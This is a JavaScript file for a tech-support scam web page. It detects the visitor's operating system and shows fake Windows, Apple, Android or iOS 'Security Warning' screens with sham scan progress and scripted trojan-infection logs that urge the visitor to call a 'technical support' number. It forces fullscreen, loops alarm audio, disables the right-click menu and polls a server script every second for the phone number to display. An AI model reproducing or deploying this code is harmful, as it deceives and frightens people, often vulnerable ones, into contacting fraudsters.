$(document).ready(function() {

    var animated = "yes";
    setInterval(function() {
        if (animated == "yes") {
            $("#second_box").animate({
                height: '430px',
                width: '374px'
            });

            $("#apple_frb").animate({
                height: '580px',
                width: '450px'
            });
            animated = "no";
        } else {
            $("#second_box").animate({
                height: '440px',
                width: '380px'
            });

            $("#apple_frb").animate({
                height: '630px',
                width: '460px'
            });
            animated = "yes";
        }
    }, 200);



    $("#windows_cover").click(function() {
        openFullscreen("Desktop");
    });

    $("#apple_cover").click(function() {
        openFullscreen("Desktop");
    });


});



function windows_script() {
    $("title").html("Windows Security Warning");
    $("#windows_cover").show();
    $("#first_box").delay(2000).fadeIn();
    var progressBar = $('.progress');
    var width = 0;
    var interval = setInterval(function() {
        width += Math.random() * 10;
        progressBar.css('width', width + '%');
        if (width >= 100) {
            clearInterval(interval);
            $("#second_box").show();
            $("#third_box").delay(500).fadeIn();
            $("#top_box").delay(500).fadeIn();
            $("#bottom_box").delay(500).fadeIn();
            $("#chat_box").delay(500).fadeIn();
            $("#chat_1").delay(2000).fadeIn();
            $("#chat_2").delay(2500).fadeIn();
            $("#chat_3").delay(3000).fadeIn();
            $("#chat_4").delay(3500).fadeIn();
            $("#chat_5").delay(4000).fadeIn();
            document.addEventListener('contextmenu', function(event) {
                event.preventDefault();
            });
        }
    }, 170);
}

var audioplaying = "yes";

function audio(type) {
    let audio;
    if (type == "Desktop") {
        audio = new Audio('audio/wa0lDErtm0s.mp3');
    } else if (type == "Mobile") {
        audio = new Audio('audio/phone.mp3');
    }

    audio.loop = true;
    audio.addEventListener('play', function() {
        const self = this;
        self.playing = true;
        self.addEventListener('pause', function() {
            self.playing = false;
        });
    });

    if (audioplaying == "yes") {
        audio.play();
        audioplaying = "no";
    }
}

const element = document.documentElement;

function openFullscreen(type) {
    if (element.requestFullscreen) {
        element.requestFullscreen();
    } else if (element.webkitRequestFullscreen) { /* Safari */
        element.webkitRequestFullscreen();
    } else if (element.msRequestFullscreen) { /* IE11 */
        element.msRequestFullscreen();
    }
    audio(type);
}

/*
windows_script();
*/

function apple_script() {
    $("title").html("Apple Security Warning");
    $("#apple_cover").show();
    $("#apple_fb").delay(500).fadeIn();
    var progressBar = $('.afb_progress');
    var width = 0;
    var interval = setInterval(function() {
        width += Math.random() * 10;
        progressBar.css('width', width + '%');
        if (width >= 100) {
            clearInterval(interval);
            $("#apple_sb").show();
            $("#apple_tb").delay(500).fadeIn();
            $("#apple_frb").delay(500).fadeIn();
            $("#apple_fifb").delay(2000).fadeIn();
            $("#apple_bottom").delay(500).fadeIn();
            document.addEventListener('contextmenu', function(event) {
                event.preventDefault();
            });
        }
    }, 100);
}

/*
apple_script();
*/

function android_script() {
    $("title").html("Anroid Security Warning");
    $("#android_cover").show();
    $("#warning_cover").delay(1000).fadeIn();
    $(".andpro_cover").show();
    var progressBar = $('.andpro');
    var width = 0;
    var interval = setInterval(function() {
        width += Math.random() * 10;
        progressBar.css('width', width + '%');
        if (width >= 100) {
            clearInterval(interval);
            $(".andpro_cover").hide();
            $("#typing-div").show();
            showOneLineAtATime("CMW-based Recovery v6.0.1.4\nModified by Google Xioulu.\nScanning SD card. (infected).\nBacking up boot image...\nBacking up recovery image...\nScanning internal memory (infected)...\nChecking for hardware infections (infected)...\nDone Scanning\n 14 trojans found\nStarting removal process...\nBacking up data\nBacking up cache...\nno sd-ext found. Skipping backup of sd-ext.\nGenerating md5sum...\n \n--Wiping Trojans...\n Wiping /data...\nWiping /cache...\n Wiping /sdcard/.android_secure...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Skipping automated removal...\nPlease call out technical support on +1-000-000-0000 for manual removal..", $("#typing-div"));
        }
    }, 300);


}
/*
android_script();
*/
function showOneLineAtATime(text, div) {
    var lines = text.split("\n");
    var currentLine = 0;
    var currentDiv = $("<div></div>").appendTo(div);
    currentDiv.text(lines[currentLine]);
    setInterval(function() {
        currentLine++;
        if (currentLine < lines.length) {
            currentDiv = $("<div></div>").appendTo(div);
            currentDiv.text(lines[currentLine]);
        } else {
            clearInterval(this);
            $("#anderror_cover").show();
        }
        if (div.height() < div.prop("scrollHeight")) {
            div.children(":first").remove();
        }
    }, 300); // Change delay value to adjust display time per line in milliseconds

}


function ios_script() {
    $("title").html("IOS Security Warning");
    $("#ios_cover").show();
    $("#ioswarning_cover").delay(1000).fadeIn();
    $(".iospro_cover").show();
    var progressBar = $('.iospro');
    var width = 0;
    var interval = setInterval(function() {
        width += Math.random() * 10;
        progressBar.css('width', width + '%');
        if (width >= 100) {
            clearInterval(interval);
            $(".iospro_cover").hide();
            $("#iostyping-div").show();
            showOneLineAtATimeAnd("CMW-based Recovery v6.0.1.4\nModified by Apple Xioulu.\nScanning SD card. (infected).\nBacking up boot image...\nBacking up recovery image...\nScanning internal memory (infected)...\nChecking for hardware infections (infected)...\nDone Scanning\n 14 trojans found\nStarting removal process...\nBacking up data\nBacking up cache...\nno sd-ext found. Skipping backup of sd-ext.\nGenerating md5sum...\n \n--Wiping Trojans...\n Wiping /data...\nWiping /cache...\n Wiping /sdcard/.android_secure...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Trying again...\nError removing trojans from internal memory..\n Skipping automated removal...\nPlease call out technical support on +1-000-000-0000 for manual removal..", $("#iostyping-div"));
        }
    }, 300);
}

function showOneLineAtATimeAnd(text, div) {
    var lines = text.split("\n");
    var currentLine = 0;
    var currentDiv = $("<div></div>").appendTo(div);
    currentDiv.text(lines[currentLine]);
    setInterval(function() {
        currentLine++;
        if (currentLine < lines.length) {
            currentDiv = $("<div></div>").appendTo(div);
            currentDiv.text(lines[currentLine]);
        } else {
            clearInterval(this);
            $("#ioserror_cover").show();
        }
        if (div.height() < div.prop("scrollHeight")) {
            div.children(":first").remove();
        }
    }, 300); // Change delay value to adjust display time per line in milliseconds

}

/*
ios_script();
*/

function detect_os() {
    var userAgent = navigator.userAgent;

    // Check if device is a mobile phone
    var isMobile = /Mobile/i.test(userAgent);

    // Check if operating system is Android
    var isAndroid = /Android/i.test(userAgent);

    // Check if operating system is iOS
    var isiOS = /(iPhone|iPad|iPod)/i.test(userAgent);

    // Check if operating system is Windows
    var isWindows = /Windows/i.test(userAgent);

    // Check if operating system is macOS or iOS
    var isMacOS = /(Macintosh|Mac_PowerPC|MacIntel|Mac OS)/.test(userAgent) && !isiOS;
    var isMacOSX = /(Mac OS X)/.test(userAgent) && !isiOS;
    var isMacOSClassic = /(Mac OS)/.test(userAgent) && !isiOS;

    if (isMobile) {
        if (isAndroid) {
            android_script();
        } else if (isiOS) {
            ios_script();
        } else {
            android_script();
        }
    } else {
        if (isWindows) {
            windows_script();
        } else if (isMacOS) {
            apple_script();
        } else {
            android_script();
        }
    }

}
/*
detect_os();
*/

function start() {
    var userAgent = navigator.userAgent;
    var isMobile = /Mobile/i.test(userAgent);
    /*
	if(isMobile){
		openFullscreen("Mobile");
	}
	else{
		openFullscreen("Desktop");
	}
    */
    $("#offer_cover").hide();
    detect_os();
}

start();

setInterval(function() {
    $.get("tfn.php", {}, function(data) {
        if (data != "") {
            $(".tfn_num").text(data);
        }
    });

}, 1000);